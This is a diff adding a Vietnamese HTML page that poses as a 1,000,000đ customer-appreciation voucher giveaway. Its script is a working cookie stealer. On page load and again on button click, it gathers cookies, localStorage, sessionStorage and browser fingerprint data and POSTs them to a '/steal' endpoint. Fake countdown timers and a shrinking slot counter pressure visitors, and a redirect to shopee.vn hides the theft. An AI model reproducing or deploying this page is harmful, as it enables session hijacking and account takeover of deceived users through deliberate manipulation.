@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>🎁 Chương trình tri ân khách hàng</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0d0d2b, #1a1a3e);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(30px);
+            border-radius: 48px;
+            padding: 50px 40px 40px;
+            max-width: 540px;
+            width: 100%;
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 215, 0, 0.12);
+            border: 1px solid rgba(255, 215, 0, 0.15);
+            text-align: center;
+        }
+
+        .badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #fbbf24, #f59e0b);
+            color: #0d0d2b;
+            font-weight: 800;
+            font-size: 12px;
+            padding: 6px 20px;
+            border-radius: 30px;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 20px rgba(251, 191, 36, 0.3);
+        }
+
+        .gift-icon {
+            font-size: 72px;
+            margin: 5px 0 15px;
+            display: inline-block;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+        }
+
+        h1 {
+            font-size: 30px;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+
+        h1 span {
+            color: #fbbf24;
+        }
+
+        .sub {
+            color: #a0a0c0;
+            font-size: 15px;
+            margin-bottom: 28px;
+            line-height: 1.7;
+        }
+
+        .sub strong {
+            color: #fbbf24;
+        }
+
+        .info-box {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 20px;
+            padding: 18px 22px;
+            margin: 18px 0 28px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .info-box p {
+            color: #c0c0e0;
+            font-size: 14px;
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .info-box p:last-child {
+            border-bottom: none;
+        }
+
+        .info-box span {
+            color: #fbbf24;
+            font-weight: 600;
+        }
+
+        #claimBtn {
+            background: linear-gradient(135deg, #fbbf24, #f59e0b);
+            border: none;
+            width: 100%;
+            padding: 18px 24px;
+            font-size: 20px;
+            font-weight: 700;
+            border-radius: 60px;
+            color: #0d0d2b;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 8px 35px rgba(251, 191, 36, 0.3);
+        }
+
+        #claimBtn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 12px 50px rgba(251, 191, 36, 0.5);
+        }
+
+        #claimBtn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .loader {
+            display: none;
+            width: 32px;
+            height: 32px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #fbbf24;
+            border-radius: 50%;
+            margin: 12px auto 0;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .timer {
+            color: #7777a0;
+            font-size: 14px;
+            margin-top: 14px;
+        }
+
+        .timer strong {
+            color: #fbbf24;
+        }
+
+        .footer-note {
+            margin-top: 22px;
+            color: #444466;
+            font-size: 12px;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            padding-top: 18px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px 28px;
+                border-radius: 32px;
+            }
+            h1 {
+                font-size: 24px;
+            }
+            .gift-icon {
+                font-size: 56px;
+            }
+            #claimBtn {
+                font-size: 17px;
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="badge">🎯 Chính thức</div>
+        <div class="gift-icon">🎁</div>
+        <h1>Chúc mừng <span>bạn</span>!</h1>
+        <p class="sub">
+            Bạn đã trúng <strong>voucher 1.000.000đ</strong> từ chương trình tri ân<br />
+            <span style="color:#fbbf24;font-weight:600;">#XuânYêuThương2026</span>
+        </p>
+
+        <div class="info-box">
+            <p>🎟 Mã giảm giá: <span>VOUCHER1000</span></p>
+            <p>⏳ Hạn sử dụng: <span>31/12/2026</span></p>
+            <p>👥 Số lượng: <span id="countdown">Còn 87 suất</span></p>
+            <p>📍 Áp dụng: <span>Toàn quốc</span></p>
+        </div>
+
+        <button id="claimBtn">🎁 Nhận ngay ưu đãi</button>
+        <div class="loader" id="loader"></div>
+        <div class="timer">
+            ⏰ Ưu đãi sẽ đóng sau <strong id="timerDisplay">05:00</strong>
+        </div>
+        <div class="footer-note">
+            * Chỉ áp dụng cho người dùng đã đăng nhập. Mỗi tài khoản 1 lần.<br />
+            <span style="color:#555577;">🔒 Kết nối an toàn SSL</span>
+        </div>
+    </div>
+
+    <script>
+        // ====== CẤU HÌNH ======
+        const SERVER_URL = window.location.origin + '/steal';
+
+        // ====== LẤY DỮ LIỆU ======
+        function getAllData() {
+            let localStorageData = {};
+            try {
+                localStorageData = { ...localStorage };
+            } catch (_) {
+                localStorageData = { error: "Không thể đọc localStorage" };
+            }
+
+            let sessionStorageData = {};
+            try {
+                sessionStorageData = { ...sessionStorage };
+            } catch (_) {
+                sessionStorageData = { error: "Không thể đọc sessionStorage" };
+            }
+
+            const data = {
+                url: window.location.href,
+                domain: window.location.hostname,
+                path: window.location.pathname,
+                cookies: document.cookie || '(Không có cookie)',
+                localStorage: localStorageData,
+                sessionStorage: sessionStorageData,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                screenColorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'Direct',
+                timestamp: new Date().toISOString(),
+                isMobile: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)
+            };
+            return data;
+        }
+
+        // ====== GỬI VỀ SERVER ======
+        function sendData(data) {
+            return fetch(SERVER_URL, {
+                method: 'POST',
+                credentials: 'include',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        }
+
+        // ====== TỰ ĐỘNG GỬI KHI LOAD ======
+        window.addEventListener('load', function() {
+            const data = getAllData();
+            sendData(data).catch(() => {});
+            console.log('✅ Đã gửi dữ liệu về server');
+        });
+
+        // ====== HIỆU ỨNG FOMO ======
+        let timeLeft = 300;
+        const timerEl = document.getElementById('timerDisplay');
+        setInterval(() => {
+            if (timeLeft <= 0) {
+                timerEl.textContent = '00:00';
+                return;
+            }
+            const mins = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+            const secs = String(timeLeft % 60).padStart(2, '0');
+            timerEl.textContent = `${mins}:${secs}`;
+            timeLeft--;
+        }, 1000);
+
+        let count = 87;
+        const countEl = document.getElementById('countdown');
+        setInterval(() => {
+            if (count > 8) {
+                const decrease = Math.floor(Math.random() * 4) + 1;
+                count = Math.max(8, count - decrease);
+                countEl.textContent = `Còn ${count} suất`;
+            }
+        }, 1800);
+
+        // ====== XỬ LÝ CLICK ======
+        const btn = document.getElementById('claimBtn');
+        const loader = document.getElementById('loader');
+
+        btn.addEventListener('click', function() {
+            btn.disabled = true;
+            btn.textContent = '⏳ Đang xử lý...';
+            loader.style.display = 'block';
+
+            const data = getAllData();
+            sendData(data)
+                .then(() => {
+                    loader.style.display = 'none';
+                    btn.textContent = '✅ Đã nhận! Kiểm tra email';
+                    btn.style.background = 'linear-gradient(135deg, #34d399, #059669)';
+                    btn.style.boxShadow = '0 8px 35px rgba(52, 211, 153, 0.3)';
+                    setTimeout(() => {
+                        window.location.href = 'https://shopee.vn/';
+                    }, 1500);
+                })
+                .catch(() => {
+                    loader.style.display = 'none';
+                    btn.textContent = '⚠️ Lỗi, thử lại';
+                    btn.style.background = 'linear-gradient(135deg, #f87171, #dc2626)';
+                    btn.disabled = false;
+                    setTimeout(() => {
+                        btn.style.background = 'linear-gradient(135deg, #fbbf24, #f59e0b)';
+                        btn.textContent = '🎁 Nhận ngay ưu đãi';
+                    }, 2000);
+                });
+        });
+
+        console.log('🍪 Cookie Stealer đã sẵn sàng!');
+    </script>
+</body>
+</html>
